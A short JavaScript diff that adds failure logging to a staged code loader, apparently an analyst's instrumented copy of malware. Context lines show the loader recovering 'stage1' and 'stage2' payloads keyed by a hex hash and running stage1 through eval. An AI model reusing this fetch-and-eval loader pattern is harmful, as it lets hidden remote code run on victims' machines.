@@ -143,10 +143,12 @@ async function main() {
       "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e",
     );
 
-    // Original behavior: 
+    // Original behavior:
     console.log("[redacted] stage1 recovered:", stage1.length);
     eval(stage1);
-  } catch {}
+  } catch {
+    console.log("stage1 failed to query");
+  }
 
   try {
     const stage2 = await recoverStage(
@@ -165,7 +167,9 @@ async function main() {
     });
 
     console.log("[redacted] stage2 recovered:", stage2.length);
-  } catch {}
+  } catch {
+    console.log("stage2 failed to query");
+  }
 }
 
 main();
